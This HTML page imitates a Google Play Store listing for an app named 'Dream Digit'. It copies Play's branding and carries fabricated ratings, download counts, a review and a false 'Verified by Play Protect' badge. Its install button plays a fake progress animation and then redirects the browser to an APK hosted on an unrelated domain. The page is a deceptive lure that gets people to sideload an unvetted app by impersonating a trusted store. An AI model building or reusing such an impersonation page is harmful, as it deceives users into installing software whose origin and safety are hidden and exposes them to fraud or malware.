<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dream Digit - Google Play Store</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --play-green: #01875f;
            --text-main: #202124;
            --text-sub: #5f6368;
            --border: #dadce0;
        }

        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            background-color: #fff;
            color: var(--text-main);
            overflow-x: hidden;
        }

        /* Navbar Styling */
        .navbar {
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            background: white;
            z-index: 100;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }

        /* ICON WITH CIRCLE PROGRESS */
        .app-header {
            display: flex;
            gap: 24px;
            margin-bottom: 25px;
            align-items: center;
        }

        .icon-wrapper {
            position: relative;
            width: 84px;
            height: 84px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .app-icon {
            width: 72px;
            height: 72px;
            border-radius: 16px;
            z-index: 2;
            object-fit: cover;
        }

        /* Circular Progress SVG */
        .progress-ring {
            position: absolute;
            top: 0;
            left: 0;
            transform: rotate(-90deg);
            z-index: 1;
            display: none; /* Hidden until install starts */
        }

        .progress-ring__circle {
            transition: stroke-dashoffset 0.3s;
            stroke: var(--play-green);
            stroke-linecap: round;
        }

        .app-title-box h1 {
            font-size: 22px;
            margin: 0;
            font-weight: 500;
        }

        .developer {
            color: var(--play-green);
            font-weight: 500;
            font-size: 14px;
        }

        /* Stats Section */
        .stats-bar {
            display: flex;
            justify-content: space-around;
            text-align: center;
            margin: 20px 0;
        }

        .stat-item { flex: 1; position: relative; }
        .stat-item:not(:last-child)::after {
            content: ""; position: absolute; right: 0; top: 20%; height: 60%; width: 1px; background: var(--border);
        }

        .stat-val { font-weight: 700; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 3px; }
        .stat-label { font-size: 11px; color: var(--text-sub); }

        /* Buttons */
        .install-btn {
            background-color: var(--play-green);
            color: white;
            border: none;
            width: 100%;
            padding: 10px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .verified-badge {
            background: #f8f9fa;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 20px 0;
            border: 1px solid #f1f3f4;
        }

        /* Ratings Layout */
        .ratings-flex { display: flex; align-items: center; gap: 30px; margin: 20px 0; }
        .big-rating { font-size: 48px; font-weight: 500; }
        .rating-bars { flex-grow: 1; }
        .bar-row { display: flex; align-items: center; gap: 10px; margin-bottom: 4px; }
        .bar-bg { height: 8px; background: #eee; flex-grow: 1; border-radius: 10px; overflow: hidden; }
        .bar-fill { height: 100%; background: var(--play-green); border-radius: 10px; }

        /* Review Styles */
        .review-item { margin-bottom: 25px; border-bottom: 1px solid #f1f3f4; padding-bottom: 15px; }
        .user-info { display: flex; align-items: center; gap: 12px; margin-bottom: 8px; }
        .avatar { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 500; font-size: 12px; }
        .review-content { font-size: 14px; color: var(--text-sub); line-height: 1.4; }
    </style>
</head>
<body>

<div class="navbar">
    <div style="display:flex; align-items:center; gap:15px;">
        <i class="fas fa-arrow-left"></i>
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" height="24">
    </div>
    <div style="display:flex; gap:20px; color:var(--text-sub);">
        <i class="fas fa-search"></i>
        <i class="fas fa-ellipsis-v"></i>
    </div>
</div>

<div class="container">
    <div class="app-header">
        <div class="icon-wrapper">
            <svg class="progress-ring" width="84" height="84" id="svgCircle">
                <circle class="progress-ring__circle" stroke-width="3" fill="transparent" r="38" cx="42" cy="42" id="circleBar"/>
            </svg>
            <img src="https://gogamex.fun/wp-content/uploads/2026/02/logo-8.png" class="app-icon" alt="Logo">
        </div>
        <div class="app-title-box">
            <h1>Dream Digit</h1>
            <div class="developer">Dream Digit Official</div>
            <div class="stat-label">Contains ads â€¢ In-app purchases</div>
        </div>
    </div>

    <div class="stats-bar">
        <div class="stat-item">
            <div class="stat-val">4.9 <i class="fas fa-star" style="font-size:10px"></i></div>
            <div class="stat-label">12K reviews</div>
        </div>
        <div class="stat-item">
            <div class="stat-val">5.2 MB</div>
            <div class="stat-label">Rated for 18+</div>
        </div>
        <div class="stat-item">
            <div class="stat-val">1M+</div>
            <div class="stat-label">Downloads</div>
        </div>
    </div>

    <button id="mainBtn" class="install-btn" onclick="startInstall()">Install</button>

    <div class="verified-badge">
        <i class="fas fa-shield-check" style="color:var(--play-green); font-size:18px;"></i>
        <span>Verified by Play Protect. Seamless and secure.</span>
    </div>

    <div class="ratings-section">
        <h2 style="font-size:18px; font-weight:500;">Ratings and reviews</h2>
        <div class="ratings-flex">
            <div style="text-align:center">
                <div class="big-rating">4.9</div>
                <div style="color:var(--play-green); font-size:10px;">
                    <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
                </div>
            </div>
            <div class="rating-bars">
                <div class="bar-row"><span style="font-size:11px; width:10px">5</span><div class="bar-bg"><div class="bar-fill" style="width:95%"></div></div></div>
                <div class="bar-row"><span style="font-size:11px; width:10px">4</span><div class="bar-bg"><div class="bar-fill" style="width:3%"></div></div></div>
                <div class="bar-row"><span style="font-size:11px; width:10px">1</span><div class="bar-bg"><div class="bar-fill" style="width:2%"></div></div></div>
            </div>
        </div>
    </div>

    <div class="review-item">
        <div class="user-info">
            <div class="avatar" style="background:#7e57c2">AK</div>
            <span style="font-size:14px; font-weight:500;">Amit Kumar</span>
        </div>
        <div style="color:var(--play-green); font-size:10px; margin-bottom:5px;">
            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
        </div>
        <p class="review-content">Best app for results. Super fast and reliable.</p>
    </div>
</div>

<script>
    function startInstall() {
        const btn = document.getElementById('mainBtn');
        const circle = document.getElementById('circleBar');
        const svg = document.getElementById('svgCircle');
        
        // Circle settings
        const radius = circle.r.baseVal.value;
        const circumference = radius * 2 * Math.PI;
        circle.style.strokeDasharray = `${circumference} ${circumference}`;
        circle.style.strokeDashoffset = circumference;

        // Start animation
        btn.disabled = true;
        btn.style.background = "#e8f0fe";
        btn.style.color = "#01875f";
        btn.innerHTML = "Waiting for download...";
        svg.style.display = "block";

        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 5;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                btn.innerHTML = "Open";
                btn.style.background = "white";
                btn.style.border = "1px solid var(--border)";
                // Redirect to APK
                window.location.href = "https://app.dreammdigit.com/apk/v2/skbApp.apk";
            }
            
            const offset = circumference - (progress / 100) * circumference;
            circle.style.strokeDashoffset = offset;
            
            if (progress < 100) {
                btn.innerHTML = Math.round(progress) + "%";
            }
        }, 200);
    }
</script>

</body>
</html>
